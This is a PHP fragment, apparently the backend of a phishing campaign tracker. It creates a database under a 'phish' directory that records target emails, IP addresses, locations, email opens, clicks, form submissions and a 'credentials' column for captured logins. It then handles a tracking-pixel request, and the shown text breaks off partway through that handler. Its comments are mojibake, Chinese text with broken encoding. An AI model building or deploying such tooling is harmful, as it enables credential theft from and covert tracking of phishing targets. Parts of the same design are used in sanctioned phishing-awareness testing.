$tracking_db = '/var/log/phish/tracking.db';

// åˆå§‹åŒ–æ•°æ®åº“
function init_db() {
    global $tracking_db;
    $db = new SQLite3($tracking_db);
    
    $db->exec('CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        tracking_token VARCHAR(32),
        target_email VARCHAR(255),
        ip_address VARCHAR(45),
        user_agent TEXT,
        referer TEXT,
        country VARCHAR(2),
        city VARCHAR(100),
        opened BOOLEAN DEFAULT 0,
        clicked BOOLEAN DEFAULT 0,
        submitted BOOLEAN DEFAULT 0,
        credentials TEXT
    )');
    
    $db->exec('CREATE TABLE IF NOT EXISTS clicks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        tracking_token VARCHAR(32),
        element VARCHAR(100),
        page VARCHAR(255)
    )');
}

// è®°å½•é‚®ä»¶æ‰“å¼€ï¼ˆè¿½è¸ªåƒç´ ï¼‰
if ($_GET['action'] == 'pixel') {
    $token = $_GET['token'] ?? '';
    $db = new SQLite3($tracking_db);
    $stmt = $db->prepare('UPDATE visits SET opened=1 WHERE tracking_token=?');
    $stmt->bindValue(1, $token);
    $stmt->execute();
    
